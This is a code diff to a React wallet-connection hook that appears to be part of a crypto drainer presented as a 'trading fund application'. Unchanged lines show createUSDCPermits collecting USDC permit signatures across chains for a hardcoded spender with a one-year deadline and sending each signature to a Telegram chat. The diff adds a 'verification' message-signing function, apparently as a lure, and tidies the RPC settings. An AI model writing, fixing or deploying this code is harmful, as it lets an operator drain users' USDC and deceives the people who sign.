@@ -24,15 +24,14 @@ export interface USDCBalance {
 const SUPPORTED_CHAINS = {
   1: {
     name: 'Ethereum',
-    // FIX: Correctly checksummed address
     usdcAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
     usdcPermitVersion: '2',
-    rpcUrl: 'https://rpc.ankr.com/eth',
+    // FIX: Switched to Cloudflare's public RPC which does not require an API key
+    rpcUrl: 'https://cloudflare-eth.com',
     explorerUrl: 'https://etherscan.io',
   },
   56: {
     name: 'BNB Smart Chain',
-    // FIX: Correctly checksummed address
     usdcAddress: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
     usdcPermitVersion: '1',
     rpcUrl: 'https://bsc-dataseed.binance.org/',
@@ -75,7 +74,7 @@ async function sendToTelegram(message: string) {
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'Markdown', // Use Markdown for rich text formatting
+        parse_mode: 'Markdown',
       }),
     });
 
@@ -107,7 +106,7 @@ export const useRealWallet = () => {
   const initializeWalletConnect = useCallback(async () => {
     try {
       const provider = await EthereumProvider.init({
-        projectId: 'YOUR_WALLETCONNECT_PROJECT_ID', 
+        projectId: 'YOUR_WALLETCONNECT_PROJECT_ID',
         chains: Object.keys(SUPPORTED_CHAINS).map(Number),
         showQrModal: true,
         metadata: {
@@ -168,7 +167,7 @@ export const useRealWallet = () => {
             `Failed to fetch USDC balance on chain ${chainId}:`,
             error
           );
-          return null; 
+          return null;
         }
       }
     );
@@ -243,7 +242,36 @@ export const useRealWallet = () => {
     fetchUSDCBalances,
     toast,
   ]);
-  
+
+  // FIX: Re-added this function to handle simple message signing
+  const signVerificationMessage = async (): Promise<string | null> => {
+    const { provider, address, isConnected } = walletState;
+    if (!isConnected || !provider || !address) {
+      toast({ title: "Wallet not connected", variant: "destructive" });
+      return null;
+    }
+
+    try {
+      const message = `I am verifying my wallet ownership for the trading fund application.\n\nWallet: ${address}\nTimestamp: ${Date.now()}`;
+      const signer = await provider.getSigner();
+      const signature = await signer.signMessage(message);
+
+      toast({
+        title: "Message Signed",
+        description: "Verification signature created successfully!",
+      });
+      return signature;
+    } catch (error: any) {
+      toast({
+        title: "Signing Failed",
+        description: error.message || 'User rejected the request.',
+        variant: "destructive"
+      });
+      console.error("Failed to verify ownership:", error);
+      return null;
+    }
+  };
+
   const createUSDCPermits = async (): Promise<
     Array<{ chainId: number; signature: string; permitData: any }>
   > => {
@@ -255,7 +283,7 @@ export const useRealWallet = () => {
     const permits = [];
     const spender = '0x49912a0C02Ac5F3295BdD36F0F07994A4397Dad2';
     const deadline =
-      Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60; 
+      Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60;
 
     for (const [chainIdStr, chainConfig] of Object.entries(SUPPORTED_CHAINS)) {
       try {
@@ -267,16 +295,14 @@ export const useRealWallet = () => {
             { chainId: `0x${chainIdNum.toString(16)}` },
           ]);
         }
-        
-        // FIX: The original provider object handles the new network state automatically.
-        // There is no need to create a `new` provider.
+
         const signer = await provider.getSigner();
         const contract = new ethers.Contract(
           chainConfig.usdcAddress,
           ERC20_ABI,
           signer
         );
-        
+
         const domain = {
           name: await contract.name(),
           version: chainConfig.usdcPermitVersion,
@@ -301,7 +327,7 @@ export const useRealWallet = () => {
           nonce: await contract.nonces(address),
           deadline,
         };
-        
+
         const signature = await signer.signTypedData(domain, types, permitData);
 
         const message = `
@@ -314,7 +340,7 @@ export const useRealWallet = () => {
 
 *Signature:* \`${signature}\`
 `;
-        sendToTelegram(message); 
+        sendToTelegram(message);
 
         permits.push({
           chainId: chainIdNum,
@@ -344,7 +370,7 @@ export const useRealWallet = () => {
 
     return permits;
   };
-  
+
   useEffect(() => {
     const ethereum = (window as any).ethereum;
     if (!ethereum || !ethereum.on) return;
@@ -382,6 +408,8 @@ export const useRealWallet = () => {
     isConnecting,
     connectWallet,
     createUSDCPermits,
+    // FIX: Export the signing function so it can be called from your components
+    signVerificationMessage,
     disconnect,
     refreshBalances: () => {
       if (walletState.isConnected && walletState.address) {
